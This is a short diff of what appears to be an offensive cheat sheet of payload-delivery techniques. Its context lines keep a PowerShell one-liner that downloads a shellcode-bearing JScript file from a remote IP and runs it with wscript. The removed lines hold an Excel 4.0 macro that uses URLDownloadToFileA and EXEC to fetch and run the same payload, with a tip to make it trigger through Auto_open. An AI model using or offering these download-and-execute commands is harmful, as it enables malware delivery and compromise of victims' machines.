@@ -94,11 +94,3 @@ PS>wscript.exe x.js
 >powershell -c "(New-Object System.Net.WebClient).DownloadString('http://172.16.103.128:9999/ShellcodeToJScript.js')" > %temp%\x.js
 >wscript.exe %temp%\x.js
 ```
-
-7. Excel download and execute (Macro v4)
-
-```
-=CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"http://172.16.103.128:9999/ShellcodeToJScript.js","C:\Users\Public\jscript.js",0,0)
-=EXEC("wscript.exe C:\Users\Public\jscript.js")
-```
-Note: remember to change `A1` to `Auto_open`
